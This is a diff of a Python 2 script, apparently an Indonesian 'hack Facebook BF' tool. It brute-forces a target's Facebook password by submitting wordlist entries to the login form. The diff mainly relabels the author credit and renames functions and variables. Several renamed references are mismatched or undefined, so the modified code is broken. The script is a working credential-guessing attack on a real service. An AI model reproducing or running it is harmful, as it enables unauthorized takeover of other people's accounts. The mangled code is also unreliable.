@@ -47,10 +47,10 @@ def banner():
     print GG+"  √=============================================√"
     print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
     print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: IQBALZ NOOBS             |"
+    print WW+"  |            MOD BY: MALFIN PRAMANA           |"
     print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
-    print WW+"  |            FACEBOOK: Iqbalznoobs            |"
-    print Y+"  |             INSTAGRAM: IQBALZ5              |"
+    print WW+"  |            FACEBOOK: MALFIN PRAMANA PUTRA            |"
+    print Y+"  |             INSTAGRAM: XXXXX              |"
     print GL+"  |---------------------------------------------|"
     print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]         |"
     print GL+"  |---------------------------------------------|"
@@ -112,7 +112,7 @@ def main():
         print " "
         print RR+" wordlist tidak ada yg cocok..."
         print " "
-def iqbalz(iqbalz_password):
+def MALFIN(MALFIN_password):
   try:
  	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
@@ -120,7 +120,7 @@ def iqbalz(iqbalz_password):
 	site = noobs.open(login)
 	noobs.select_form(nr = 0)
 	noobs.form['email'] = email_target
-	noobs.form['pass'] = iqbalz_password
+	noobs.form['pass'] = malfin_password
 	tom = noobs.submit()
 	mask = tom.geturl()
 	if mask != login and (not 'login_attempt' in mask):
@@ -129,7 +129,7 @@ def iqbalz(iqbalz_password):
 			print "          P A S S W O R D  F I N D "
                   	print RR+"+-------------------------------------------+"
 	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
-        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
+        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(MALFIN_password)
         	        print " "
         	        raw_input(WW+"TEKAN ENTER UNTUK KELUAR...")
 			sys.exit(1)
@@ -140,11 +140,11 @@ def iqbalz(iqbalz_password):
       edit_wordlist()
       sys.exit()    	    
 def life():
-	global iqbalz_password
+	global MALFIN_password
 	password_nob = open(password_list, "r")
-	for iqbalz_password in password_nob:
-		password_nob = iqbalz_password.replace("\n","")
-		iqbalz(iqbalz_password)		
+	for MALFIN_password in password_nob:
+		password_nob = Malfin_PRAMANA.replace("\n","")
+	        MALFIN(MALFIN_password)		
 
 def runn_noobs():
          global password_list
